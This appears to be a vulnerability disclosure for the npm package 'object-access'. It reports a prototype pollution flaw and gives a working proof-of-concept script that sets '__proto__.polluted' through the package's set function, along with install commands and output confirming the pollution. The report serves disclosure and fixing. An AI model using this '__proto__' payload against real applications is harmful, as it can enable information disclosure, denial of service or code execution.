# Description

`object-access` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior using a `__proto__` payload, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var objectAccess = require("object-access")
var obj = {}
console.log("Before : " + obj.polluted);
objectAccess.set(obj, '__proto__.polluted', 'Yes! Its Polluted');
var obj1 = {}
console.log("After : " + obj1.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i object-access # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
